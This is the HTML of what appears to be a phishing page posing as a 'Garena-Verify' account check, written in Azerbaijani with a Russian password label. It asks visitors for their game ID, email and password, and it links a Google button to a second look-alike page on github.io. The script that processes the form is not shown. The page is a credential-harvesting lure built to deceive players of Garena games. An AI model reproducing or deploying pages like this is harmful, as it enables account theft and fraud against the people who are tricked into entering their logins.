<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="google-signin-client_id" content="170237457210-gq79g0c36846voeb2l9leju5uvroknpr.apps.googleusercontent.com">
    <title>Garena-Verify</title>
    <link rel="stylesheet" href="style.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
    <script>
        document.addEventListener("DOMContentLoaded", function() {
            var userAgent = navigator.userAgent || navigator.vendor || window.opera;
            if (/android/i.test(userAgent)) {
                document.querySelector('meta[name="viewport"]').setAttribute('content', 'height=1920', 'width=1080');
            }
        });
    </script>
</head>
<body>
    <div class="container" id="container">
        <div class="form-container sign-in">
            <form id="loginForm">
                <h1>Təsdiq edin!</h1>
                <div class="social-icons">
                    <a href="https://garena-verify.github.io/Google/"><i class="fab fa-google"></i></a>
                    <a href="#"><i class="fab fa-facebook"></i></a>
                    <a href="#"><i class="fab fa-twitter"></i></a>
                    <a href="#"><i class="fab fa-vk"></i></a>
                </div>
                <span>və ya el poçta ilə təsdiq edin:</span>
                <input type="text" id="id" placeholder="Id" />
                <input type="email" id="email" placeholder="Email" />
                <input type="password" id="password" placeholder="Пароль" />
                <button id="login">TƏSTIQ ED</button>
            </form>
        </div>
        <div class="toggle-container">
            <div class="toggle">
                <div class="toggle-panel toggle-right">
                    <h1>Hesabınızı Təsdiq Edin!</h1>
                </div>
            </div>
        </div>
    </div>
    <script src="script.js"></script>
</body>
</html>
